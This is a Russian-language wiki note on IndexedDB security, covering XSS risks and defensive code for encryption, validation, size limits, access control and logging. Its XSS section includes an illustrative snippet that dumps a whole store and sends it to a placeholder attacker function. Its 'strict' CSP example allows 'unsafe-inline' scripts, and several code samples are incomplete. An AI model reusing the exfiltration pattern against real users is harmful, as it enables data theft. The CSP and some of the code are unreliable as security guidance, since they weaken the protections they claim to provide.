---
aliases: [IndexedDB Security, Безопасность IndexedDB, Защита IndexedDB]
tags: [security, storage, indexeddb, frontend]
---

# Безопасность-IndexedDB

## Обзор

IndexedDB - это низкоуровневое API для хранения значительных объемов структурированных данных в браузере. В отличие от LocalStorage и SessionStorage, IndexedDB поддерживает ключ-значение хранилище с индексами, что позволяет эффективно выполнять сложные запросы к данным. Несмотря на свои преимущества, IndexedDB также подвержен определенным угрозам безопасности, которые необходимо учитывать при разработке веб-приложений.

## Особенности IndexedDB

### 1. Объем хранения

- Может хранить гораздо больше данных, чем LocalStorage
- Объем ограничивается свободным местом на устройстве пользователя
- Поддерживает сложные структуры данных

### 2. Асинхронная природа

- Все операции с IndexedDB асинхронны
- Использует Promise или событийно-ориентированный подход
- Не блокирует основной поток выполнения

### 3. Транзакционная модель

- Поддерживает транзакции для обеспечения целостности данных
- Позволяет группировать операции и откатывать при ошибках

## Уязвимости IndexedDB

### 1. XSS-атаки

Как и другие механизмы клиентского хранения, IndexedDB уязвим для атак типа Cross-Site Scripting (XSS). При внедрении вредоносного скрипта злоумышленник может получить доступ ко всем данным в IndexedDB:

```javascript
// Пример получения данных из IndexedDB при XSS-атаке
const request = indexedDB.open('myDatabase');
request.onsuccess = function(event) {
    const db = event.target.result;
    const transaction = db.transaction(['users'], 'readonly');
    const objectStore = transaction.objectStore('users');
    const getAllRequest = objectStore.getAll();
    
    getAllRequest.onsuccess = function() {
        // Злоумышленник может получить все данные
        const userData = getAllRequest.result;
        // Отправка данных на сервер злоумышленника
        sendToEvilServer(userData);
    };
};
```

> [!warning] Важно
> Даже большие объемы данных в IndexedDB могут быть скомпрометированы при XSS-атаке. Не храните чувствительные данные без дополнительной защиты.

### 2. Обход Same-Origin Policy

IndexedDB строго привязан к политике Same-Origin, но при наличии уязвимостей в других частях приложения может быть обойден.

### 3. Утечка данных через уязвимые скрипты

Динамически загружаемые или вставляемые скрипты могут получить доступ к данным IndexedDB, если они выполняются в том же контексте.

## Лучшие практики безопасности

### 1. Шифрование данных

Реализуйте клиентское шифрование для чувствительных данных, хранящихся в IndexedDB:

```javascript
// Пример шифрования данных перед сохранением в IndexedDB
class SecureIndexedDB {
    constructor(dbName, version) {
        this.dbName = dbName;
        this.version = version;
        this.encryptionKey = null;
    }

    async initEncryption() {
        // Инициализация ключа шифрования
        this.encryptionKey = await this.generateKey();
    }

    async generateKey() {
        return await window.crypto.subtle.generateKey(
            {
                name: "AES-GCM",
                length: 256,
            },
            true,
            ["encrypt", "decrypt"]
        );
    }

    async encryptData(data) {
        const encodedData = new TextEncoder().encode(JSON.stringify(data));
        const iv = window.crypto.getRandomValues(new Uint8Array(12));
        
        const encryptedData = await window.crypto.subtle.encrypt(
            {
                name: "AES-GCM",
                iv: iv,
            },
            this.encryptionKey,
            encodedData
        );

        return {
            data: Array.from(new Uint8Array(encryptedData)),
            iv: Array.from(iv)
        };
    }

    async decryptData(encryptedPackage) {
        const { data, iv } = encryptedPackage;
        
        const decryptedData = await window.crypto.subtle.decrypt(
            {
                name: "AES-GCM",
                iv: new Uint8Array(iv),
            },
            this.encryptionKey,
            new Uint8Array(data)
        );

        const decoder = new TextDecoder();
        return JSON.parse(decoder.decode(decryptedData));
    }

    async storeSecurely(storeName, key, data) {
        const encryptedData = await this.encryptData(data);
        return this.store(storeName, key, encryptedData);
    }

    async retrieveSecurely(storeName, key) {
        const encryptedData = await this.retrieve(storeName, key);
        if (encryptedData) {
            return await this.decryptData(encryptedData);
        }
        return null;
    }

    async store(storeName, key, data) {
        return new Promise((resolve, reject) => {
            const request = indexedDB.open(this.dbName, this.version);
            request.onerror = () => reject(request.error);
            request.onsuccess = () => {
                const db = request.result;
                const transaction = db.transaction([storeName], 'readwrite');
                const store = transaction.objectStore(storeName);
                const addRequest = store.put(data, key);
                
                addRequest.onsuccess = () => resolve(addRequest.result);
                addRequest.onerror = () => reject(addRequest.error);
            };
        });
    }

    async retrieve(storeName, key) {
        return new Promise((resolve, reject) => {
            const request = indexedDB.open(this.dbName, this.version);
            request.onerror = () => reject(request.error);
            request.onsuccess = () => {
                const db = request.result;
                const transaction = db.transaction([storeName], 'readonly');
                const store = transaction.objectStore(storeName);
                const getRequest = store.get(key);
                
                getRequest.onsuccess = () => resolve(getRequest.result);
                getRequest.onerror = () => reject(getRequest.error);
            };
        });
    }
}
```

### 2. Валидация и санитизация

Всегда проводите валидацию и санитизацию данных перед сохранением в IndexedDB:

```javascript
// Функция валидации данных перед сохранением
function validateDataForStorage(data) {
    // Проверка структуры данных
    if (!data || typeof data !== 'object') {
        throw new Error('Недопустимый формат данных');
    }

    // Санитизация потенциально опасных полей
    if (data.htmlContent) {
        data.htmlContent = sanitizeHTML(data.htmlContent);
    }

    // Проверка размера данных
    const dataSize = JSON.stringify(data).length;
    if (dataSize > MAX_ALLOWED_SIZE) {
        throw new Error('Размер данных превышает допустимый лимит');
    }

    return data;
}

// Использование в контексте IndexedDB
async function safeStoreData(db, storeName, key, data) {
    try {
        const validatedData = validateDataForStorage(data);
        await db.store(storeName, key, validatedData);
    } catch (error) {
        console.error('Ошибка при сохранении данных:', error);
        throw error;
    }
}
```

### 3. Ограничение объема хранимых данных

Реализуйте ограничения на объем данных, которые могут быть сохранены в IndexedDB:

```javascript
class LimitedIndexedDB {
    constructor(dbName, version, maxSize) {
        this.dbName = dbName;
        this.version = version;
        this.maxSize = maxSize; // в байтах
    }

    async storeWithSizeCheck(storeName, key, data) {
        const dataSize = JSON.stringify(data).length;
        if (dataSize > this.maxSize) {
            throw new Error(`Размер данных превышает лимит: ${dataSize} > ${this.maxSize}`);
        }

        // Проверка общего размера базы данных
        const currentSize = await this.getCurrentDBSize();
        if (currentSize + dataSize > this.maxSize) {
            throw new Error('Общий размер базы данных превышает лимит');
        }

        return this.store(storeName, key, data);
    }

    async getCurrentDBSize() {
        // Реализация получения текущего размера базы данных
        // Это может быть приблизительная оценка
        return new Promise((resolve) => {
            const request = indexedDB.open(this.dbName, this.version);
            request.onsuccess = () => {
                const db = request.result;
                // Оценка размера - приблизительная
                resolve(this.estimateDBSize(db));
                db.close();
            };
        });
    }
}
```

### 4. Управление доступом к данным

Реализуйте механизмы управления доступом к различным частям данных:

```javascript
// Класс для управления доступом к данным в IndexedDB
class AccessControlledDB {
    constructor(dbName, version) {
        this.dbName = dbName;
        this.version = version;
        this.permissions = new Map();
    }

    async storeWithAccessControl(storeName, key, data, userId, permissions) {
        const secureData = {
            data: data,
            metadata: {
                owner: userId,
                permissions: permissions,
                createdAt: new Date().toISOString()
            }
        };
        
        return this.store(storeName, key, secureData);
    }

    async retrieveWithAccessCheck(storeName, key, userId, requiredPermission) {
        const storedData = await this.retrieve(storeName, key);
        if (!storedData) {
            return null;
        }

        // Проверка прав доступа
        if (!this.hasPermission(storedData.metadata, userId, requiredPermission)) {
            throw new Error('Недостаточно прав для доступа к данным');
        }

        return storedData.data;
    }

    hasPermission(metadata, userId, requiredPermission) {
        // Проверка, является ли пользователь владельцем
        if (metadata.owner === userId) {
            return true;
        }

        // Проверка разрешений для других пользователей
        return metadata.permissions[userId]?.includes(requiredPermission) || false;
    }
}
```

## Защита от XSS

### 1. Content Security Policy (CSP)

Реализуйте строгую политику безопасности контента для предотвращения XSS-атак:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self';
```

### 2. Входная валидация

Строго валидируйте все входные данные перед сохранением в IndexedDB:

```javascript
// Пример валидации данных перед сохранением
function isValidDataStructure(data) {
    // Определение допустимой структуры данных
    const allowedTypes = ['string', 'number', 'boolean', 'object', 'array'];
    
    if (!allowedTypes.includes(typeof data) && !Array.isArray(data)) {
        return false;
    }

    // Рекурсивная проверка вложенных структур
    if (typeof data === 'object' && data !== null) {
        for (const [key, value] of Object.entries(data)) {
            if (typeof key === 'string' && !isValidDataStructure(value)) {
                return false;
            }
        }
    }

    return true;
}
```

## Использование в SPA

### 1. Кэширование данных

IndexedDB идеально подходит для кэширования данных в SPA:

```javascript
// Класс для кэширования данных в IndexedDB
class DataCache {
    constructor(dbName = 'appCache', version = 1) {
        this.db = new SecureIndexedDB(dbName, version);
        this.cacheTimeout = 30 * 60 * 1000; // 30 минут
    }

    async get(key) {
        try {
            const cached = await this.db.retrieveSecurely('cache', key);
            if (cached && Date.now() - cached.timestamp < this.cacheTimeout) {
                return cached.data;
            } else {
                // Удаление устаревших данных
                await this.db.store('cache', key, undefined);
                return null;
            }
        } catch (error) {
            console.error('Ошибка при получении кэша:', error);
            return null;
        }
    }

    async set(key, data) {
        try {
            const cacheEntry = {
                data: data,
                timestamp: Date.now()
            };
            await this.db.storeSecurely('cache', key, cacheEntry);
        } catch (error) {
            console.error('Ошибка при сохранении кэша:', error);
        }
    }
}
```

### 2. Офлайн-функциональность

IndexedDB позволяет реализовать полноценную офлайн-функциональность:

```javascript
// Класс для управления офлайн-данными
class OfflineDataManager {
    constructor(dbName = 'offlineData', version = 1) {
        this.db = new SecureIndexedDB(dbName, version);
    }

    async queueRequest(method, url, data) {
        const request = {
            id: Date.now() + Math.random(),
            method: method,
            url: url,
            data: data,
            timestamp: Date.now()
        };
        
        await this.db.storeSecurely('pendingRequests', request.id, request);
    }

    async syncWithServer() {
        const pendingRequests = await this.getAllPendingRequests();
        for (const request of pendingRequests) {
            try {
                await this.sendRequest(request);
                await this.removePendingRequest(request.id);
            } catch (error) {
                console.error('Ошибка синхронизации:', error);
                // Оставить запрос для повторной попытки
            }
        }
    }

    async getAllPendingRequests() {
        // Реализация получения всех отложенных запросов
        return new Promise((resolve, reject) => {
            const request = indexedDB.open(this.db.dbName, this.db.version);
            request.onerror = () => reject(request.error);
            request.onsuccess = () => {
                const db = request.result;
                const transaction = db.transaction(['pendingRequests'], 'readonly');
                const store = transaction.objectStore('pendingRequests');
                const getAllRequest = store.getAll();
                
                getAllRequest.onsuccess = () => resolve(getAllRequest.result);
                getAllRequest.onerror = () => reject(getAllRequest.error);
            };
        });
    }
}
```

## Мониторинг и аудит

### 1. Логирование операций

Реализуйте логирование всех операций с IndexedDB:

```javascript
// Класс для логирования операций с IndexedDB
class IndexedDBLogger {
    constructor(dbName, version) {
        this.dbName = dbName;
        this.version = version;
        this.logStoreName = 'operationsLog';
    }

    async logOperation(operation, storeName, key, data = null) {
        const logEntry = {
            operation: operation,
            storeName: storeName,
            key: key,
            timestamp: new Date().toISOString(),
            dataSize: data ? JSON.stringify(data).length : 0
        };

        // Сохранение лога в отдельное хранилище
        const request = indexedDB.open(this.dbName, this.version);
        request.onsuccess = () => {
            const db = request.result;
            const transaction = db.transaction([this.logStoreName], 'readwrite');
            const store = transaction.objectStore(this.logStoreName);
            store.add(logEntry);
        };
    }
}
```

### 2. Анализ безопасности

Регулярно анализируйте содержимое IndexedDB на предмет:

- Наличия чувствительных данных
- Подозрительных структур данных
- Необычного объема хранимых данных

## Заключение

IndexedDB предоставляет мощный механизм для хранения больших объемов данных в браузере, но требует особого внимания к безопасности. Реализация шифрования, валидации данных и управления доступом позволяет значительно повысить безопасность приложения.

При правильном использовании IndexedDB может быть безопасным способом хранения данных на стороне клиента, особенно при сочетании с другими мерами безопасности, такими как строгая CSP и надежная защита от XSS-атак.

## См. также

- [[Безопасность-LocalStorage]]
- [[Безопасность-SessionStorage]]
- [[Безопасность-куки]]
- [[XSS-защита]]
- [[Шифрование-на-клиенте]]